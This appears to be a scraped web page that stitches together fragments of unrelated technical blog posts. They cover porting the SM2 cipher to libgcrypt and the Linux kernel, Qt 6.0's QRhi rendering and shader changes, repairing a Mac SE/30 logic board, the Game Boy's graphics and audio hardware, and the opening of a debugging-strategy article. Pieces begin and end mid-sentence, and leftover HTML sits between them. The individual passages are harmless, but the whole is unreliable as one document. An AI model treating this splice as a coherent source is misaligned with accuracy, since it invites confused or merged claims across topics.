<p>The ECC algorithm in libgcrypt is a general algorithm with low coupling. So I have an idea. You can try to implement SM2 in libgcrypt first, and then transplant all of this set of things to the kernel after a small test, and further promote it to the community. It seems that this is also a way that can be accepted by the community. After having a plan, simply put on a comfortable look, solemnly put your hands on the keyboard, let your thinking flow naturally with your fingers, the next development and debugging will be relatively smooth, and soon there will be four public key algorithms. Piece set: encryption, decryption, signature, verification. These implementations were submitted to the libgcrypt community in one effort. After two rounds of review and modification, the SM2 algorithm was finally accepted by the community as a sub-algorithm of ECC. I would like to thank NIIBE Yutaka, one of the maintainers of libgcrypt, for his patience, friendliness, and Chinese tradition. The culture is also very understanding. The overall process is relatively smooth, so I won’t mention it. Attach relevant submissions:</p>
<p>http://git.gnupg.org/cgi-bin/gitweb.cgi?p=libgcrypt.git;a=search;s=Tianjia+Zhang;st=author</p>
<p>Fifth time</p>
<p>Strike while the iron is hot, because the lib/mpi library in the kernel is an older version and serves RSA. Compared with the mpi in libgcrypt, it is a castrated version. The missing functions and ECC algorithms need to be transplanted, which is not technically difficult. But it is also a fine job, and the workload is not small. In practice, all the missing things in the process of implementing SM2 are transplanted, and the corresponding SM2 algorithm and the implementation of the national secret certificate will soon be available. After several rounds of polishing and full testing, there is the initial set of patches: https://lkml.org/lkml/2020/2/16/43</p>
<p>Sixth time</p>
<p>As the old Chinese saying goes, it’s a rush, it fades again, and everything is exhausted. The progress of things once again encounters obstacles. The Linux kernel is not comparable to a dedicated cryptographic library. For such an unknown algorithm, the community showed no interest, and few people even asked about it. In the end, it was rejected because it had no practical application scenario. Of course, things can’t just end like this. Considering the large amount of code and the low willingness of the maintainer to review, we decisively cut out the encryption, decryption and signature of SM2, and only retained the necessary verification functions to support the national secret certificate. Some minor repairs and supplements have been made to the upstream of IMA to enhance the national secret algorithm in order to use the national secret function in the IMA scene as a practical case. At the same time, with the continuous soft (si) grinding (chan) hard (lan) bubble (da) with the relevant developers and maintainers, new patches are constantly being sent, and finally even the habitual reply time of the maintainers is found. The law of integration with the patch continues to slowly advance the pace of SM2’s entry into the community.During this period, there …</p></div></div></article></div></div>

                            </p>
                            
                            <p><span id="hs_cos_wrapper_post_body" data-hs-cos-general-type="meta_field" data-hs-cos-type="rich_text"><p>Last year we had a three part blog series about Qt's new approach to working with 3D graphics APIs and shading languages: <a href="https://www.qt.io/blog/qt-quick-on-vulkan-metal-direct3d">part 1</a>, <a href="https://www.qt.io/blog/qt-quick-on-vulkan-metal-and-direct3d-part-2">part 2</a>, <a href="https://www.qt.io/blog/qt-quick-on-vulkan-metal-and-direct3d-part-3">part 3</a>. For <a href="https://doc-snapshots.qt.io/qt6-dev/qtquick-index.html">Qt Quick</a>, an early, opt-in preview of the new rendering architecture was shipped in Qt 5.14, with some improvements in Qt 5.15. With the release of Qt 6.0 upcoming, let's see what has happened since Qt 5.15. It will not be possible to cover every detail of the graphics stack improvements for Qt Quick here, let alone dive into the vast amount of Qt Quick 3D features, many of which are new or improved in Qt 6.0. Rather, the aim is just to give an overview of what can be expected from the graphics stack perspective when Qt 6.0 ships later this year.</p>
<p>Note that the documentation links refer to the Qt 6 snapshot documentation. This allows seeing the latest C++ and QML API pages, including all changed and new functions, but the content is also not final. These links may also break later on.</p>
<!--more-->
<h2>QRhi improvements</h2>
<p>QRhi, the Qt Rendering Hardware Interface, is Qt's internal graphics abstraction when 3D APIs, such as OpenGL, Vulkan, Metal, and Direct 3D, are involved. Compared to 5.15, the main improvements in 6.0 are a lot of polishing fixes here and there, and, most importantly, a large set of performance optimizations. While benefitting Qt Quick as well, these become especially important with Qt Quick 3D when complex scenes with many renderable objects are involved.</p>
<p>With some simplifications, the main layers of the Qt 6.0 graphics stack can be visualized like this:</p>
<p><img src="https://www.qt.io/hs-fs/hubfs/rhiarch-3.png?width=800&amp;name=rhiarch-3.png" alt="rhiarch-3" width="800" srcset="https://www.qt.io/hs-fs/hubfs/rhiarch-3.png?width=400&amp;name=rhiarch-3.png 400w, https://www.qt.io/hs-fs/hubfs/rhiarch-3.png?width=800&amp;name=rhiarch-3.png 800w, https://www.qt.io/hs-fs/hubfs/rhiarch-3.png?width=1200&amp;name=rhiarch-3.png 1200w, https://www.qt.io/hs-fs/hubfs/rhiarch-3.png?width=1600&amp;name=rhiarch-3.png 1600w, https://www.qt.io/hs-fs/hubfs/rhiarch-3.png?width=2000&amp;name=rhiarch-3.png 2000w, https://www.qt.io/hs-fs/hubfs/rhiarch-3.png?width=2400&amp;name=rhiarch-3.png 2400w" sizes="(max-width: 800px) 100vw, 800px"></p>
<h2>Shader management</h2>
<p>The Qt Shader Tools module is now a selectable module in the installer. For applications this can be relevant because this is the module that provides the <em>qsb</em> command-line tool (not to be confused with <em>qbs</em>) and its associated CMake build system integration. In addition, the module is a mandatory dependency for Qt Quick 3D at the moment.</p>
<p>Qt 6 no longer uses OpenGL-compatible GLSL source snippets directly. Rather, shaders are all written in Vulkan-style GLSL, then reflected and translated to other shading languages, and finally packaged up into a serializable QShader object that can be consumed by QRhi. The shader preparation pipeline in Qt 6 is the following:</p>
<p><img src="https://www.qt.io/hs-fs/hubfs/shaderconditioning.png?width=1280&amp;name=shaderconditioning.png" alt="shaderconditioning" width="1280" srcset="https://www.qt.io/hs-fs/hubfs/shaderconditioning.png?width=640&amp;name=shaderconditioning.png 640w, https://www.qt.io/hs-fs/hubfs/shaderconditioning.png?width=1280&amp;name=shaderconditioning.png 1280w, https://www.qt.io/hs-fs/hubfs/shaderconditioning.png?width=1920&amp;name=shaderconditioning.png 1920w, https://www.qt.io/hs-fs/hubfs/shaderconditioning.png?width=2560&amp;name=shaderconditioning.png 2560w, https://www.qt.io/hs-fs/hubfs/shaderconditioning.png?width=3200&amp;name=shaderconditioning.png 3200w, https://www.qt.io/hs-fs/hubfs/shaderconditioning.png?width=3840&amp;name=shaderconditioning.png 3840w" sizes="(max-width: 1280px) 100vw, 1280px"></p>
<p>In QML applications using Qt Quick, whenever working with ShaderEffect, or subclassing QSGMaterialShader, the application will need to provide a baked shader pack in form of a .qsb file. These are generated by the <em>qsb</em> tool. This does not however mean that developers have to start dealing with a new tool directly: with the CMake integration one can easily list the vertex, fragment, and compute shaders in CMakeLists.txt via the qt6_add_shaders() CMake function. Invoking qsb and packing the resulting .qsb files into the Qt resource system is then taken care of by the build system.</p>
<p>See <a href="https://doc-snapshots.qt.io/qt6-dev/qtshadertools-index.html">the shadertools documentation</a> for an overview of how graphics and compute shaders are handled in Qt 6 and the details of the qsb tool and its CMake integration.</p>
<h2>Direct OpenGL is no more for Qt Quick</h2>
<p>In Qt 5.14 and 5.15, Qt Quick shipped with an optional QRhi-based rendering path that could be enabled by setting the environment variable <em>QSG_RHI</em>. This allowed painless experimenting with the new stack, while keeping the traditional, battle tested direct OpenGL code path the default.</p>
<p>In Qt 6.0 all such switches are gone. There is no way get rendering go directly to OpenGL with Qt Quick scenes. Rather, the new default is the QRhi-based rendering path of the Qt Quick scene graph. Other than the defaults changing, the ways to configure what QRhi backend, and so which graphics API to use are mostly unchanged compared to Qt 5.15. See <a href="https://doc-snapshots.qt.io/qt6-dev/qtquick-visualcanvas-scenegraph-renderer.html#rendering-via-the-qt-rendering-hardware-interface">the documentation</a> for details. One difference is better API naming: in C++ code to request, and so effectively tie the application to, a given QRhi backend (and by extension graphics API) is now done through the <a href="https://doc-snapshots.qt.io/qt6-dev/qquickwindow.html#setGraphicsApi">QQuickWindow::setGraphicsApi()</a> function, whereas in 5.15 this task used to be pushed onto an overload of setSceneGraphBackend(), leading to fairly inaccurate naming.</p>
<p>There are a number of implications, although many applications will not notice any of these. If an application uses neither shader code (ShaderEffect, QSGMaterial) nor does it perform its own rendering with OpenGL directly, there is a very high chance that it will need no migration steps at all. (at least not because of graphics)</p>
<h4>Applications using OpenGL directly</h4>
<p>What about applications that use OpenGL directly in one way or another, and are not interested in functioning with other graphics APIs? For example, applications that use <a href="https://doc-snapshots.qt.io/qt6-dev/qquickframebufferobject.html">QQuickFramebufferObject</a>, or connect to signals like <a href="https://doc-snapshots.qt.io/qt6-dev/qquickwindow.html#beforeRendering">QQuickWindow::beforeRendering()</a> to inject their own OpenGL rendering under or above the Qt Quick scene. This is when the setGraphicsApi() function mentioned above comes into play for real: if an application wishes, it can always state that it wants OpenGL (or Vulkan, or Metal, or D3D) only, and nothing else. That way it is guaranteed that Qt Quick is going to use the corresponding QRhi backend (or else it will fail to initialize), so the application can safely assume that going directly to OpenGL is safe, because Qt Quick will also end up rendering through OpenGL. Note that this does not exempt the application from having to do other type of porting steps: for example, if it in addition uses ShaderEffect or creates its own custom materials, it will still need to migrate to the new ways of handling shaders and materials.</p>
<h4>QSG* and QQuick* API changes</h4>
<p>The API changes mainly fall into 3 categories. This is not going to be an exhaustive list, but rather just a peek at some of the important changes. Detailed change lists and porting guides are expected to be available with the final Qt 6.0 release.</p>
<ul>
<li>
<div><p>Different approach to shaders and materials: <a href="https://doc-snapshots.qt.io/qt6-dev/qsgmaterialshader.html">QSGMaterialShader</a> received a full revamp (matching more or less what the now-removed QSGMaterialRhiShader used to be in 5.14 and 5.15). <a href="https://doc-snapshots.qt.io/qt6-dev/qml-qtquick-shadereffect.html">ShaderEffect</a> no longer allows inline shader strings. Rather, the vertexShader and fragmentShader properties are URLs, similarly to <span>Image.source</span> and others. They can refer to a local .qsb file, or a .qsb file embedded via the Qt resource system (qrc).</p></div>
</li>
<li>
<p>Removing OpenGL-specifics from QQuickWindow, QSGTexture, and elsewhere. It should come as no surprise that functions like <em>GLuint textureId()</em>, <em>createTextureFromId(GLuint textureId, ...)</em>, or <em>setRenderTarget(GLuint fboId)</em> are now gone. Adopting (wrapping) an existing OpenGL texture, Vulkan image, Metal texture, or D3D11 texture, or accessing the underlying native texture for a QSGTexture is still perfectly possible, but now is done via a different set of APIs, such as <a href="https://doc-snapshots.qt.io/qt6-dev/qnativeinterface-qsgvulkantexture.html">QSGVulkanTexture</a> and the <a href="https://doc-snapshots.qt.io/qt6-dev/qnativeinterface-sub-qtquick.html">other similar classes</a>, instances of which are <a href="https://doc-snapshots.qt.io/qt6-dev/qsgtexture.html?__hstc=233546881.8510e053e4fb66e1a58543a6e9886427.1603454017210.1603454017210.1603454017210.1&amp;__hssc=233546881.1.1603454017210&amp;__hsfp=1285229618#nativeInterface" rel="noopener">queryable from QSGTexure</a>.</p>
<ul>
<li>
<div><p>Integrating the application's own custom rendering with the graphics API that Qt Quick renders with is fully supported, not just for OpenGL, but also Vulkan, Metal, and D3D11. Due to their nature however, some of these APIs will need more than connecting to one single signal like beforeRendering() or afterRendering(). For example, we now also have <a href="https://doc-snapshots.qt.io/qt6-dev/qquickwindow.html#beforeRenderPassRecording">beforeRenderPassRecording()</a>. See the relevant section in the <a href="https://doc-snapshots.qt.io/qt6-dev/qtquick-visualcanvas-scenegraph.html#mixing-scene-graph-and-the-native-graphics-api">scenegraph overview docs</a> for more details and links to examples. Finally, the number of native graphics resources queryable via <a href="https://doc-snapshots.qt.io/qt6-dev/qsgrendererinterface.html">QSGRendererInterface</a> has been extended, now covering Vulkan, Metal, and Direct 3D too.</p></div>
</li>
</ul>
</li>
<li>
<p>Extending support for redirecting the Qt Quick scene into an offscreen render target. <a href="https://www.qt.io/blog/%3Ehttps://doc-snapshots.qt.io/qt6-dev/qquickrendercontrol.html">QQuickRenderControl</a> and the related infrastructure has been heavily enhanced. This was done not just to enable working with graphics APIs other than OpenGL the same way as in Qt 5 (for example, to render a Qt Quick scene into a Vulkan VkImage without an on-screen window), but also to enable integration with AR/VR frameworks and APIs such as <a href="https://www.khronos.org/openxr/">OpenXR</a> (in combination with any of Vulkan, D3D11, or OpenGL). Besides the slightly changed QQuickRenderControl interface, we now have a number of helper classes that improve the configurability of a QQuickWindow: <a href="https://doc-snapshots.qt.io/qt6-dev/qquickrendertarget.html">QQuickRenderTarget</a>, <a href="https://doc-snapshots.qt.io/qt6-dev/qquickgraphicsdevice.html">QQuickGraphicsDevice</a>, and <a href="https://doc-snapshots.qt.io/qt6-dev/qquickgraphicsconfiguration.html">QQuickGraphicsConfiguration</a>. These are essential in scenarios where a more fine grained control is needed: integrating with APIs like OpenXR is not always straightforward when an existing rendering engine is involved, with a number of potential chicken-egg problems when it comes to the creation, initialization, and ownership of instance, device, and other graphics objects: Which Vulkan instance should Qt Quick use, or should it create a new one upon initializing the scenegraph for the first time? Which Vulkan physical device or DXGI adapter should Qt Quick pick, or just stay with the default? Which VkDevice extensions should be enabled in addition to what Qt itself needs? What 2D image/texture should rendering target, who creates that and when? The expectation is that Qt 6.0 will be well-prepared and providing the foundations for further exploring the world of AR/VR during the rest of the Qt 6.x series.</p>
</li>
</ul>
<h4>New approach to handling shader code in ShaderEffect</h4>
<p>A comprehensive example of the new approach to shader code in ShaderEffect is the Qt 6 port of the classic Qt 5 Cinematic Experience demo. <a href="https://github.com/alpqr/qt5-cinematic-experience" rel="noopener">(GitHub repo)</a> This version is ported to CMake and is fully functional with all graphics APIs, including all shader and particle effects.</p>
<p><img src="https://www.qt.io/hs-fs/hubfs/cinematic.png?width=702&amp;name=cinematic.png" alt="cinematic" width="702" srcset="https://www.qt.io/hs-fs/hubfs/cinematic.png?width=351&amp;name=cinematic.png 351w, https://www.qt.io/hs-fs/hubfs/cinematic.png?width=702&amp;name=cinematic.png 702w, https://www.qt.io/hs-fs/hubfs/cinematic.png?width=1053&amp;name=cinematic.png 1053w, https://www.qt.io/hs-fs/hubfs/cinematic.png?width=1404&amp;name=cinematic.png 1404w, https://www.qt.io/hs-fs/hubfs/cinematic.png?width=1755&amp;name=cinematic.png 1755w, https://www.qt.io/hs-fs/hubfs/cinematic.png?width=2106&amp;name=cinematic.png 2106w" sizes="(max-width: 702px) 100vw, 702px"></p>
<p>Looking at the QML source code, for example the code for the <a href="https://github.com/alpqr/qt5-cinematic-experience/blob/master/content/CurtainEffect.qml" rel="noopener">curtain effect </a>shows that indeed it has all inline GLSL strings removed.</p>

      <p><em>Or how I fixed my Mac SE/30 that was not booting unexpectedly</em></p>
<p>One day around a year ago I was playing with my SE/30 (the best looking computer ever) and I was trying to install Debian on it for fun. But after inserting some floppies and trying to boot from them the computer wouldn’t turn back on. I mean it would turn on but with weird static graphics and no sound at startup. I already had a hard time figuring out how I would boot Linux on that machine (which I succeeded at doing) that I did not want to spend more time fixing it.</p>
<p>Here is what I was left with :</p>
<p><img src="https://ronangaillard.github.io/img/simasimac.jpg" alt="simasimac"></p>
<p>A few weeks ago I really wanted to play again with my old Macintosh and experiment with A/UX, the first Apple unix OS ! So I started looking on the internet to see if the problem I had was common. And indeed it was ! I learnt it was called Simasimac and often happened because old electrolytic capacitors would leak. It could lead to two main things : traces could be connected together because this leak could be conductive, or it could corrode traces and make them not continuous anymore.</p>
<p>So I had to open my Mac SE/30 for the first time. Hopefully I had bought a few years ago the very long screwdrivers you need to open these vintage Macs. And after taking the logic board out I did notice some minor leakage but no sign of “cracks” on the capacitors. An easy solution I found on the internet was to wash the logic board in the dishwasher (crazy !?), and it happened to often solve the first problem of capacitor leaks : the short circuit between traces. As I had no dishwasher I took a tooth brush and wash the logic board under clear water insisting on areas with leakage. I let it dry for one big day, finished cleaning it with alcohol and tried to boot the SE/30 again. But it would still display those weird zebra stripes on the screen and would not boot.</p>
<p>The logic board before cleaning :
<img src="https://ronangaillard.github.io/img/dirty-mobo.jpg" alt="dirty mobo"></p>
<p>I also saw on the internet that a bad/discharged battery (the red one you see on the previous picture) could lead to boot problems and simasimac. I did not really trust this as I am convinced this is only used to keep time and some user settings (such as mouse speed) in a volatile RAM. And I knew it was discharged from a long time ago (even when the Mac did boot normally) because the Mac would not keep time when it was turned off. Anyway I would still need a new battery when the Mac would be back to normal so I bought one off Amazon, put it in and tried to boot again. But no surprise it still did not want to boot !</p>
<p>Later readings also taught me that if the simasimac stayed after Logic Board cleaning one solution could be to recap the all board. Thanks to this excellent article : <a href="https://recapamac.com.au/macintosh-se-30/">https://recapamac.com.au/macintosh-se-30/</a> I was able to quickly buy the needed caps off DigiKey and receive them in less than 48 hours (even in France !).</p>
<p>For reference here are the parts I ordered :</p>
<table>
<thead>
<tr>
<th>Capacitance</th>
<th>DK Part Number</th>
<th>Qty</th>
</tr>
</thead>
<tbody>
<tr>
<td>1uF</td>
<td>399-3730-1-ND</td>
<td>1</td>
</tr>
<tr>
<td>220uF</td>
<td>1572-1103-ND</td>
<td>1</td>
</tr>
<tr>
<td>470uF</td>
<td>1572-1494-ND</td>
<td>1</td>
</tr>
<tr>
<td>47uF</td>
<td>399-18075-1-ND</td>
<td>10</td>
</tr>
</tbody>
</table>
<p>I would highly advise to recap your vintage Mac as soon as possible to avoid such issues I had (and that many others have). It could destroy your Logic Board and you could never boot you mac again. It’s quite easy to do if you have some equipment, patience and some little skills.</p>
<p>So I used my hot air gun to remove all these caps and most of the little one exploded. They do really smell awful when they do so, I would advise to do it in a well ventilated area. I have to say I was a bit scared to damage the PCB because some traces looked really fragile. I had some issues removing the axial capacitors because the original soldering tin was hard to melt. I’m not sure why, I tried to change temperature from 300 degrees Celsius to 400, but it was not really easy.</p>
<p>I then soldered back every caps, again axial caps where hard to put back because even with my desoldering needles I had a hard time putting the capacitors legs through the holes. Anyway, everything was soldered back :</p>
<p><img src="https://ronangaillard.github.io/img/recapped-mobo.jpg" alt="recapped mobo"></p>
<p>I’m not super happy about the result, contacts are well made and well soldered but capacitors are not always well aligned.</p>
<p>But I was super excited because I thought my problem was be solved. Most sites and articles I read said recapping was the ultimate fixing step. So I confidently plugged everything back and turned on my Mac. Nothing was fixed at all, it was still in the same state as the beginning.</p>
<p>So I was back to reading articles, blog posts, forums and reddit to find people having the same issues. I found out bad RAM chips could lead to my issue, so I started removing RAM bars or swapping them but nothing changed. So I posted to Reddit to get some feedback and advice : <a href="https://www.reddit.com/r/VintageApple/comments/jh5oo1/simasimac_even_after_recapping_any_hint_or_advice/">https://www.reddit.com/r/VintageApple/comments/jh5oo1/simasimac_even_after_recapping_any_hint_or_advice/</a></p>
<p>I learnt that it could be a problem with the ROM : either the chip itself or the traces between the CPU and the ROM. I did not really know where to start, so I searched for the SE/30 schematics and found them here : <a href="https://museo.freaknet.org/gallery/apple/stuff/mac/andreas.kann/schemat.html">https://museo.freaknet.org/gallery/apple/stuff/mac/andreas.kann/schemat.html</a> I noticed the ROM is directly connected to the CPU (which is in fact of no surprise and classical design as it is the first boot device). So I searched for the 68030 (CPU) pinout on Google and found it at the end of the NXP datasheet : <a href="https://www.nxp.com/docs/en/reference-manual/MC68030UM.pdf">https://www.nxp.com/docs/en/reference-manual/MC68030UM.pdf</a> The next thing I had to do is to make sure each address trace, and each data trace was well connected between the CPU and the ROM socket. I used my multimeter in continuous mode and got the following pin mapping on the Logic Board :</p>
<p><img src="https://ronangaillard.github.io/img/rom-socket-matching.jpg" alt="rom socket mapping"></p>
<p>So I knew my CPU was well connected to my ROM. My ROM itself could have defects but I wanted to make sure every peripherals worked before buying a new ROM because they are quite expensive on eBay.</p>
<p>After some more discussion on Reddit I decided to do the same thing I did with ROM but for the RAM. If you look at the schematics you’ll notice that the connections between the RAM and the CPU is a bit more complex because it involves many more logic (for paging for instance). So I started to check the traces between the CPU and the Glue Logic Chip (which is the chip between the CPU and the RAM). Still using the schematics I noticed that not all address bus bits were connected between these two chips. So I tested the one that were supposed to be connected with my multimeter, and I found out that the A24 trace seemed to be not continuous :</p>
<p><img src="https://ronangaillard.github.io/img/a24-trace.jpg" alt="A24 trace"></p>
<p>I was half surprised because the A24 trace goes below the C11 capacitor. And that non continuous trace could be explained by the fact that the old C11 capacitor leaked, and that the leakage corroded or destroyed the trace. So I did a hot fix with a stripping wire going directly from the Glue Chip to the CPU :</p>
<p><img src="https://ronangaillard.github.io/img/a24-fix.jpg" alt="A24 fix"></p>
<p>I then plugged everything back, and success !! It’s alive ! The weird zebra stripes had disappeared and it was showing the mouse cursor !</p>
<p>Unfortunately it does not boot from the internal hard drive, I’m not sure if I wiped it when trying to install Linux or not. So I created a new floppy boot disk with System 7.5. But unfortunately again the SE/30 does not want to boot from that floppy disk. I am still a bit confused as the floppy drive used to work really well. So I removed it from the Mac case and cleaned the drive heads with alcohol. But still, it doesn’t want to boot from my floppy. I guess the next step is to dismantle the whole floppy drive and give it a good clean. In the mean time I bought a SCSI2SD which will make everything easier and more reliable.</p>
<p>Thanks again to everyone on Reddit who did advise me well on how to spot the issue on my Mac SE/30. Today the floppy drive problem does not frighten me as I’m confident to fix it easily, and even if I don’t fix it I will be able to use the SCSI2SD to boot and use my SE/30.</p>

Although, only bit manipulation instructions are found.</li></ul><p>Finally, they also added a <strong>few new instructions</strong> that are not present in either Z80 or 8080. I think explaining them one by one goes beyond the scope of this article, but the main idea is that they optimise certain operations conditioned by the way Nintendo/Sharp arranged the hardware.</p><h4 id="memory-available">Memory available</h4><p>Nintendo fitted <strong>8 KB of RAM</strong> for general purpose use (which they call <strong>Work RAM</strong> or ‘WRAM’). Notice that this is four times larger than what the <a href="https://www.copetti.org/projects/consoles/nes/">NES</a> included.</p><h4 id="hardware-access">Hardware access</h4><p>The Sharp keeps a 8-bit data bus and a 16-bit address bus, so up to 64 KB of memory can be addressed. The memory map is composed of:</p><ul><li>Cartridge space.</li><li>WRAM and Display RAM.</li><li>I/O (joypad, audio, graphics and LCD)</li><li>Interrupt controls.</li></ul><hr><h2 id="graphics">Graphics</h2><p>All graphics calculations are done by the CPU, then the <strong>Picture Processing Unit</strong> or ‘PPU’ renders them. This is another component found inside DMG-CPU and it’s actually based on the <a href="https://www.copetti.org/projects/consoles/nes/#graphics">predecessor’s PPU</a>.</p><p>The picture is displayed in an integrated LCD screen, it has a resolution of <strong>160×144 pixels</strong> and shows <strong>4 shades of grey</strong> (white, light grey, dark grey and black). But since the original gameboy has a green LCD, graphics will look <em>greenish</em>.</p><p>If you’ve read the NES article before, you may remember that the PPU was designed to follow the CRT beam. However (and for obvious reasons), we got an LCD screen in the Gameboy. Well, the new PPU doesn’t alter that part, since LCDs require to be refreshed too. In fact, some special effects achieved thanks to this behaviour will also be supported on the Gameboy.</p><h4 id="organising-the-content">Organising the content</h4><div><a href="https://www.copetti.org/images/consoles/gameboy/ppu.394820f7e0961be199b5abbc173e13e86e173b0c5ffa8ae4cf703cc46f98c535.png"><picture>

Those 8 KB will contain most of the data the PPU will need to render graphics, other bits will be stored inside the PPU as they will require a faster access rate.</p><p>The game is in charge of populating the different areas with the correct type of data. Moreover, the PPU exposes some register so they game can instruct how to manage that data (there are many rules, though).</p><h4 id="constructing-the-frame">Constructing the frame</h4><p>Let’s see now how the PPU manages to draw stuff on the screen. For demonstration purposes, <em>Super Mario Land 2</em> will be used as example:</p><div><ul><li id="tab-2-1-tiles-link"><a href="#tab-2-1-tiles">Tiles</a></li><li id="tab-2-2-background-link"><a href="#tab-2-2-background">Background</a></li><li id="tab-2-3-window-link"><a href="#tab-2-3-window">Window</a></li><li id="tab-2-4-sprites-link"><a href="#tab-2-4-sprites">Sprites</a></li><li id="tab-2-5-result-link"><a href="#tab-2-5-result">Result</a></li></ul><div><div id="tab-2-1-tiles"><h4>Tiles</h4><div><figcaption>Tiles Found in the Pattern Table</figcaption></div><p>The PPU uses <strong>tiles</strong> as a basic ingredient for rendering graphics, specifically, <strong>sprites and backgrounds</strong>.</p><p>Tiles are just <strong>8x8 bitmaps</strong> stored in VRAM in a region called <strong>Tile set</strong> or ‘Tile pattern table’, each pixel corresponds to one of the four shades of grey available. Finally, tiles are grouped into two pattern tables.</p><p>In order to build the picture, tiles are referenced in another type of table called <strong>Tile map</strong>. This information will tell the PPU where to render the tiles. Two maps are stored to construct different layers of the frame.</p><p>The next sections explain how tile maps are used to construct the layers.</p></div><div id="tab-2-2-background"><h4>Background</h4><p>The Background layer is a <strong>256x256 pixel</strong> (32x32 tiles) map containing <strong>static tiles</strong>. However, remember that only 160x144 is viewable on the screen, so the game decides which part is selected for display. Games can also move the viewable area during gameplay, that’s how the <strong>Scrolling Effect</strong> is accomplished.</p><p>One of the two tile maps can be used to build the background layer.</p></div><div id="tab-2-3-window"><h4>Window</h4><p>The Window is a <strong>160x144 pixel</strong> layer containing tiles displayed on top of the background and sprites. It doesn’t scroll.</p><p>The remaining tile map can be assigned to the window layer.</p><p>At first, this may sound like a silly feature. After all, the window layer overlaps everything else so what’s useful for? Well, both Background and Window can be used concurrently at different parts of the screen. This is accomplished by changing the <code>LCDCONT</code> register during specific scan-lines.</p><p>Thus, games normally use it to display player stats, score and other ‘always-on’ information.</p></div><div id="tab-2-4-sprites"><h4>Sprites</h4><div><a href="https://www.copetti.org/images/consoles/gameboy/ppu_mario/sprite.bca34c94b876ff47fbc94dbef084cd087e404831d4eb37d065f6a4b6a78cf8d8.png"><picture>

They can also overlap each other and appear behind the background, the viewable graphic will be decided based on a priority attribute.</p><p>They also have an extra colour available: <strong>Transparent</strong>. So, they can only display three different greys instead of four. Luckily, this layer allows defining two colour palettes make use of every colour.</p><p>The <strong>Object Attribute Memory</strong> or ‘OAM’ is a map stored inside the PPU which specifies the tiles that will be used as sprites. Games fill this region by calling the <strong>DMA unit</strong> found inside the chip, this fetches data from main RAM or game ROM to OAM.</p><p>Apart from the tile index, each entry contains the following attributes: X-Y position, colour palette, priority and flip flags (allowing to rotate the tile vertically and horizontally).</p><p>The PPU is limited to rendering up to <strong>ten sprites per scan-line</strong> and <strong>up to 40 per frame</strong>, overflowing this will result in sprites not being drawn.</p></div><div id="tab-2-5-result"><h4>Result</h4><div><a href="https://www.copetti.org/images/consoles/gameboy/ppu_mario/result.300b8ad1b603cf0e0af6d8fd194141f7d6fc9ca74d1eb57909cf6f92daeaaec6.png"><picture>

However, the CPU can’t modify the tables while the PPU is reading from VRAM, so the system provides a set of interrupts triggered when the PPU is idle. You can recall this behaviour from the times of the NES.</p><p>When a single scan-line is complete, the <strong>Horizontal Blank</strong> interrupt is called. This allows to fiddle with the part of the frame that has not yet been drawn.</p><p>When all scan-lines are complete, the <strong>Vertical Blank</strong> interrupt is called. The game can now update the graphics for the next frame.</p><p>There’s an extra state called <strong>OAM search</strong> that is triggered at the start of the scan-line, at this point the PPU is processing which sprites will be displayed in that scan-line, so the game can update any region except OAM.</p></div></div></div><h4 id="secrets-and-limitations">Secrets and Limitations</h4><p>The inclusion of the Window layer and extra interrupts allowed for new types of content and effects.</p><div><ul><li id="tab-5-1-wobble-effect-link"><a href="#tab-5-1-wobble-effect">Wobble effect</a></li></ul><div><div id="tab-5-1-wobble-effect"><h4>Wobble effect</h4><p><video poster="https://www.copetti.org/images/consoles/gameboy/video_posters/zelda.a3d6874d3e350b643cf06b924599eee374797b75615d711ede81e55d4456f855.jpg" preload="none" width="898" height="720" src="https://www.copetti.org/videos/consoles/gameboy/zelda.dc3d178cfc686f6c824fe116ffeb29d4934e537178a0af52ee3ea12605dbaf3c.mp4" href="https://www.copetti.org/videos/consoles/gameboy/zelda.dc3d178cfc686f6c824fe116ffeb29d4934e537178a0af52ee3ea12605dbaf3c.mp4" controls="" controllist="nodownload">

These use one of four different tones constructed by varying its pulse width. The first channel has an exclusive <strong>Sweep control</strong> available.</p><p>Due to the limited number of channels, the melody will often be interrupted when effects have to be played as part of the gameplay. This is very noticeable in games like Pokemon Red/Blue when, during a battle, the Pokemon’s cry will overlap all the channels used for music.</p></div><div id="tab-7-2-noise"><h4>Noise</h4><p>Noise is basically a set of random wave-forms that sound like white static. One channel is allocated for it.</p><p>Games use it for percussion or <em>ambient</em> effects.</p><p>This channel has only 2 tones available to use, one produces <em>clean static</em> and the other produces <em>robotic static</em>. Its frequency can also be controlled.</p></div><div id="tab-7-3-wave"><h4>Wave</h4><p>The APU allows to store <strong>32 custom wave-forms</strong> to be heard from its forth channel. Each wave is composed of a 4-bit sample that will be played repeatedly.</p><p>This channel also allows to control its frequency (enabling to produce different musical notes from the same sample) and volume.</p></div></div></div><h4 id="secrets-and-limitations-1">Secrets and Limitations</h4><p>The mixer outputs stereo sound, so the channels can be assigned to the left side or on the right one, this is only possible to hear from the headphones though! The speaker is mono.</p><p>Furthermore, the mixer chip is also connected to a dedicated pin on the cartridge, allowing to stream an <strong>extra channel</strong> with the condition that the cartridge has to actually output the analogue sound (only possible with extra hardware). No game in the market ended up using this feature.</p><hr><h2 id="games">Games</h2><p>Games are written in assembly and they have a maximum size of <strong>32 KB</strong>, this is due to the limited address space available. However, with the use of a <strong>Memory Bank Controller</strong> (mapper), games can reach bigger sizes. The biggest cartridge found in the market has a 1 MB ROM.</p><p>Cartridges can include a real-time clock and an external battery along with SRAM to hold saves.</p><h4 id="external-communications">External communications</h4><p>For the first time, games can communicate with other consoles with the use of a <strong>Game Boy Link</strong> cable, which provides multiplayer functionality.

        <p><strong>Developers sometimes try to use feature development strategies to find bugs—and that doesn’t always work. How do we know when our debugging process doesn’t work? and what alternative strategies can we adopt so we can find bugs more easily?</strong></p>
<p>Something is wrong in your application.</p>
<p>One part of the system sends messages to another part. It works, except sometimes, it sends an extra, errant message. You’re not sure why the extra messages happen, but you want to find out and stop them.</p>
<p>You have a hunch about what might cause the problem, so you try changing that. It doesn’t work!</p>
<p>Hmm. You can think of one other possible cause. So you change that. It doesn’t work either!</p>
<p>Your exploratory changes start to feel more and more random. You feel frustrated, and you’re not sure about the right next step.</p>
<p>You’d like to know&nbsp; that you are making progress, even if you haven’t found the issue yet. In other words, you’d like a <em>debugging strategy</em><strong>.</strong></p>
<h3>Here’s the most common debugging strategy</h3>
